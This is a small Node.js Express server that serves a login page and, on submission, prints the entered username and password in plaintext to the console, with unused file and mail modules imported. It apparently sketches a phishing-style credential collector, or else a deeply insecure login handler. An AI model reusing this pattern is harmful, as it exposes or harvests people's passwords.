var express = require('express');
var app = express();
var bodyParser = require("body-parser");
var fs = require("fs");
var nodemailer = require('nodemailer');
app.use(bodyParser.urlencoded({extended:true}));
app.use(express.static('library'))
app.get("/",function(req,res){
    res.sendFile('login.html',{root:__dirname})
});
app.post("/success",function(req,res){
    var username = req.body.username;
    var password = req.body.password;
    password = JSON.stringify(password,null,2);
    username = JSON.stringify(username,null,2);
    console.log(username+"->"+password);
    var data = username+"->"+password+"  \n";
    res.render("success.ejs");
});
app.listen(3000,function(){
    console.log("Server listening on port 3000");
});
